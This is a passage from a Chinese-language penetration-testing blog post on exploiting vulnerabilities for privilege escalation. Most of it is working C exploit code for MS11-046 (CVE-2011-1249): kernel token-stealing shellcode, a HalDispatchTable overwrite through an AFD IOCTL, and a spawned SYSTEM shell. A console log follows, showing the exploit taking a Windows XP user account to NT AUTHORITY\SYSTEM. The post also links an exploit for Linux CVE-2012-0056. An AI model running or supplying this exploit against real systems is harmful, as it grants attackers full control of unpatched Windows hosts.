class="line">    <span class="comment">// initiate the use of the Winsock DLL</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms742213(v=vs.85).aspx</span></span><br><span class="line">    wsaStartupErrorCode = WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(wsaStartupErrorCode != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      [-] Failed (error code: %d)\n&quot;</span>, wsaStartupErrorCode);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create socket</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Creating socket\n&quot;</span>);</span><br><span class="line">    SOCKET targetDeviceSocket = INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx</span></span><br><span class="line">    targetDeviceSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(targetDeviceSocket == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [-] Failed (error code: %ld)\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// connect to a closed port</span></span><br><span class="line">    <span class="comment">// connect to port 0 on the local machine</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientService</span>;</span></span><br><span class="line">    clientService.sin_family = AF_INET;</span><br><span class="line">    clientService.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    clientService.sin_port = htons(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [*] Connecting to closed port\n&quot;</span>);</span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms737625(v=vs.85).aspx</span></span><br><span class="line">    <span class="type">int</span> connectResult;</span><br><span class="line">    connectResult = connect(targetDeviceSocket, (SOCKADDR *) &amp;clientService, <span class="keyword">sizeof</span>(clientService));</span><br><span class="line">    <span class="keyword">if</span> (connectResult == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;            [-] Connected (error code: %ld)\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// CREATE TOKEN STEALING SHELLCODE</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating token stealing shellcode\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct the token stealing shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x52</span>,                                                        <span class="comment">// PUSH EDX                     Save EDX on the stack (save context)</span></span><br><span class="line">        <span class="number">0x53</span>,                                                         <span class="comment">// PUSH EBX                     Save EBX on the stack (save context)</span></span><br><span class="line">        <span class="number">0x33</span>,<span class="number">0xC0</span>,                                                   <span class="comment">// XOR EAX, EAX                 Zero out EAX (EAX = 0)</span></span><br><span class="line">        <span class="number">0x64</span>,<span class="number">0x8B</span>,<span class="number">0x80</span>,<span class="number">0x24</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                          <span class="comment">// MOV EAX, FS:[EAX+0x124]      Retrieve current _KTHREAD structure</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x40</span>,shellcode_KPROCESS,                                <span class="comment">// MOV EAX, [EAX+_KPROCESS]     Retrieve _EPROCESS structure</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0xC8</span>,                                                   <span class="comment">// MOV ECX, EAX                 Copy EAX (_EPROCESS) to ECX</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x98</span>,shellcode_TOKEN,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                    <span class="comment">// MOV EBX, [EAX+_TOKEN]        Retrieve current _TOKEN</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x80</span>,shellcode_APLINKS,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                  <span class="comment">// MOV EAX, [EAX+_APLINKS] &lt;-|  Retrieve FLINK from ActiveProcessLinks</span></span><br><span class="line">        <span class="number">0x81</span>,<span class="number">0xE8</span>,shellcode_APLINKS,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                  <span class="comment">// SUB EAX, _APLINKS         |  Retrieve EPROCESS from ActiveProcessLinks</span></span><br><span class="line">        <span class="number">0x81</span>,<span class="number">0xB8</span>,shellcode_UPID,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// CMP [EAX+_UPID], 0x4      |  Compare UniqueProcessId with 4 (System Process)</span></span><br><span class="line">        <span class="number">0x75</span>,<span class="number">0xE8</span>,                                                   <span class="comment">// JNZ/JNE                ----  Jump if not zero/not equal</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x90</span>,shellcode_TOKEN,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                    <span class="comment">// MOV EDX, [EAX+_TOKEN]        Copy SYSTEM _TOKEN to EDX</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0xC1</span>,                                                   <span class="comment">// MOV EAX, ECX                 Copy ECX (current process _TOKEN) to EAX</span></span><br><span class="line">        <span class="number">0x89</span>,<span class="number">0x90</span>,shellcode_TOKEN,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                    <span class="comment">// MOV [EAX+_TOKEN], EDX        Copy SYSTEM _TOKEN to current process _TOKEN</span></span><br><span class="line">        <span class="number">0x5B</span>,                                                        <span class="comment">// POP EBX                      Pop current stack value to EBX (restore context)</span></span><br><span class="line">        <span class="number">0x5A</span>,                                                        <span class="comment">// POP EDX                      Pop current stack value to EDX (restore context)</span></span><br><span class="line">        <span class="number">0xC2</span>,<span class="number">0x08</span>                                                    <span class="comment">// RET 8                        Return</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] Shellcode assembled\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate memory (RWE permissions) for the shellcode</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] Allocating memory\n&quot;</span>);</span><br><span class="line">    LPVOID shellcodeAddress;</span><br><span class="line">    shellcodeAddress = VirtualAlloc((PVOID) <span class="number">0x02070000</span>, <span class="number">0x20000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="type">int</span> errorCode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(shellcodeAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        errorCode = GetLastError();</span><br><span class="line">        <span class="comment">// in case of ERROR_INVALID_ADDRESS</span></span><br><span class="line">        <span class="keyword">if</span>(errorCode == <span class="number">487</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Attempt to access invalid address</span></span><br><span class="line">            <span class="comment">// occurs since a fixed address is being reserved</span></span><br><span class="line">            <span class="comment">//   http://stackoverflow.com/questions/21368429/error-code-487-error-invalid-address-when-using-virtualallocex</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [!] Could not reserve entire range\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;         [*] Rerun exploit\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// in case of any other error</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [-] Failed (error code: %d)\n&quot;</span>, errorCode);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [+] Address:      %#010x\n&quot;</span>, shellcodeAddress);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy the shellcode to the allocated memory</span></span><br><span class="line">    <span class="built_in">memset</span>(shellcodeAddress, <span class="number">0x90</span>, <span class="number">0x20000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((shellcodeAddress + <span class="number">0x10000</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Shellcode copied\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// EXPLOIT THE VULNERABILITY</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Exploiting vulnerability\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// send AFD socket connect request</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] Sending AFD socket connect request\n&quot;</span>);</span><br><span class="line">    DWORD lpInBuffer[lpInBufferSize];</span><br><span class="line">    <span class="built_in">memset</span>(lpInBuffer, <span class="number">0</span>, (lpInBufferSize * <span class="keyword">sizeof</span>(DWORD)));</span><br><span class="line"></span><br><span class="line">    lpInBuffer[<span class="number">3</span>] = <span class="number">0x01</span>;</span><br><span class="line">    lpInBuffer[<span class="number">4</span>] = <span class="number">0x20</span>;</span><br><span class="line">    ULONG lpBytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(DeviceIoControl(</span><br><span class="line">        (HANDLE) targetDeviceSocket,</span><br><span class="line">        <span class="number">0x00012007</span>,                                                        <span class="comment">// IOCTL_AFD_CONNECT</span></span><br><span class="line">        (PVOID) lpInBuffer, <span class="keyword">sizeof</span>(lpInBuffer),</span><br><span class="line">        (PVOID) (HalDispatchTableKrnlSpcAddr + <span class="number">0x6</span>), <span class="number">0x0</span>,</span><br><span class="line">        &amp;lpBytesReturned, <span class="literal">NULL</span></span><br><span class="line">        ) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx</span></span><br><span class="line">        errorCode = GetLastError();</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="comment">// in case of ERROR_INVALID_NETNAME</span></span><br><span class="line">        <span class="keyword">if</span>(errorCode == <span class="number">1214</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// AFD socket connect request successful</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [+] Done\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// in case of ERROR_NOACCESS</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(errorCode == <span class="number">998</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// AFD socket connect request unsuccessful - target is patched</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [!] Target patched\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;         [*] Possible security patches\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; securityPatchesCount; i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;            [*] %s\n&quot;</span>, securityPatchesPtr[i]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// in case of any other error message</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// print the error code</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [-] Failed (error code: %d)\n&quot;</span>, errorCode);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// elevate privileges of the current process</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Elevating privileges to SYSTEM\n&quot;</span>);</span><br><span class="line">    ULONG outInterval = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProfile%2FNtQueryIntervalProfile.html</span></span><br><span class="line">    NtQueryIntervalProfile(<span class="number">2</span>, &amp;outInterval);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// spawn shell (with elevated privileges)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [*] Spawning shell\n&quot;</span>);</span><br><span class="line">    <span class="comment">// spawn SYSTEM shell within the current shell (remote shell friendly)</span></span><br><span class="line">    system (<span class="string">&quot;c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clean up and exit</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] Exiting SYSTEM shell\n&quot;</span>);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EoF</span></span><br></pre></td></tr></table></figure>
<p><strong>将代码编译成 exe 即可，个人用的是codeblock编译的</strong></p>
<p><strong>报错解决：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215170314261-1779689695.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215170534082-1385706214.png" /></p>
<p><strong>XP测试</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\a&gt;<span class="built_in">whoami</span></span><br><span class="line">DH-CA8822AB9589\a</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\a&gt;net user a</span><br><span class="line">User name                    a</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country code                 000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password expires             3/29/2022 9:07 PM</span></span><br><span class="line"><span class="string">Password changeable          2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   2/15/2022 5:09 PM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Users</span></span><br><span class="line"><span class="string">Global Group memberships     *None</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Documents and Settings\a&gt;cd Desktop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Documents and Settings\a\Desktop&gt;test.exe</span></span><br><span class="line"><span class="string">[*] MS11-046 (CVE-2011-1249) x86 exploit</span></span><br><span class="line"><span class="string">   [*] by Tomislav Paskalev</span></span><br><span class="line"><span class="string">[*] Identifying OS</span></span><br><span class="line"><span class="string">   [+] 32-bit</span></span><br><span class="line"><span class="string">   [+] Windows XP SP3</span></span><br><span class="line"><span class="string">[*] Locating required OS components</span></span><br><span class="line"><span class="string">   [+] ntkrnlpa.exe</span></span><br><span class="line"><span class="string">      [*] Address:      0x804d7000</span></span><br><span class="line"><span class="string">      [*] Offset:       0x00a70000</span></span><br><span class="line"><span class="string">      [+] HalDispatchTable</span></span><br><span class="line"><span class="string">         [*] Offset:    0x00ade838</span></span><br><span class="line"><span class="string">   [+] NtQueryIntervalProfile</span></span><br><span class="line"><span class="string">      [*] Address:      0x7c90d820</span></span><br><span class="line"><span class="string">   [+] ZwDeviceIoControlFile</span></span><br><span class="line"><span class="string">      [*] Address:      0x7c90d260</span></span><br><span class="line"><span class="string">[*] Setting up exploitation prerequisite</span></span><br><span class="line"><span class="string">   [*] Initialising Winsock DLL</span></span><br><span class="line"><span class="string">      [+] Done</span></span><br><span class="line"><span class="string">      [*] Creating socket</span></span><br><span class="line"><span class="string">         [+] Done</span></span><br><span class="line"><span class="string">         [*] Connecting to closed port</span></span><br><span class="line"><span class="string">            [+] Done</span></span><br><span class="line"><span class="string">[*] Creating token stealing shellcode</span></span><br><span class="line"><span class="string">   [*] Shellcode assembled</span></span><br><span class="line"><span class="string">   [*] Allocating memory</span></span><br><span class="line"><span class="string">      [+] Address:      0x02070000</span></span><br><span class="line"><span class="string">      [*] Shellcode copied</span></span><br><span class="line"><span class="string">[*] Exploiting vulnerability</span></span><br><span class="line"><span class="string">   [*] Sending AFD socket connect request</span></span><br><span class="line"><span class="string">      [+] Done</span></span><br><span class="line"><span class="string">      [*] Elevating privileges to SYSTEM</span></span><br><span class="line"><span class="string">         [+] Done</span></span><br><span class="line"><span class="string">         [*] Spawning shell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\WINDOWS\system32&gt;whoami　　　　 #提权成功！</span></span><br><span class="line"><span class="string">NT AUTHORITY\SYSTEM</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215171204065-343305943.png" /></p>
<p><strong>提权成功！</strong></p>
<h2 id="ms14-068漏洞演示">3. Ms14-068漏洞演示</h2>
<p><strong>参见：<a
target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/articles/15922332.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15922332.html</a></strong></p>
<h2 id="linux下提权cev-2012-0056-演示"><strong>4.
Linux下提权（CEV-2012-0056 演示）</strong></h2>
<p><strong>漏洞详解</strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://git.zx2c4.com/CVE-2012-0056/about/"
class="uri">https://git.zx2c4.com/CVE-2012-0056/about/</a></strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://www.jb51.net/LINUXjishu/56997.html"
class="uri">https://www.jb51.net/LINUXjishu/56997.html</a></strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2012-0056"
class="uri">https://www.cve.org/CVERecord?id=CVE-2012-0056</a></strong></p>
<p><strong>Ubuntu11.10</strong></p>
<p><a
target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/releases/11.10/ubuntu-11.10-desktop-amd64.iso"
class="uri">http://old-releases.ubuntu.com/releases/11.10/ubuntu-11.10-desktop-amd64.iso</a></p>
<p><strong>渗透代码</strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/35161"
class="uri">https://www.exploit-db.com/exploits/35161</a></strong></p>
<p><strong>演示：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220225175414215-1202091326.png" /></p>
<p><strong>注意：</strong> 由于Ubuntu 11.10
已不再维护，所以安装软件时找不到包，可通过挂载光盘（.iso）安装已集成到ISO中的旧版软件，也可单独下载软件包安装（如deb包），但此时可能需要安装更多的依赖包
/ 库，可依据提示安装即可！</p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mount /dev/cdrom /media/cdrom </span><br><span class="line">sudo apt-cdrom add   <span class="comment">#添加到更新源</span></span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Ghost
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" title="渗透测试之提权：利用漏洞提权">https://z9m8r8.github.io/2022/02/15/渗透测试之提权：利用漏洞提权/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83/" rel="prev" title="渗透测试之提权：利用相关工具提权">
                  <i class="fa fa-angle-left"></i> 渗透测试之提权：利用相关工具提权
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/23/ms14-068%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="next" title="ms14-068 漏洞复现">
                  ms14-068 漏洞复现 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Ghost</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">226k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">13:43</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

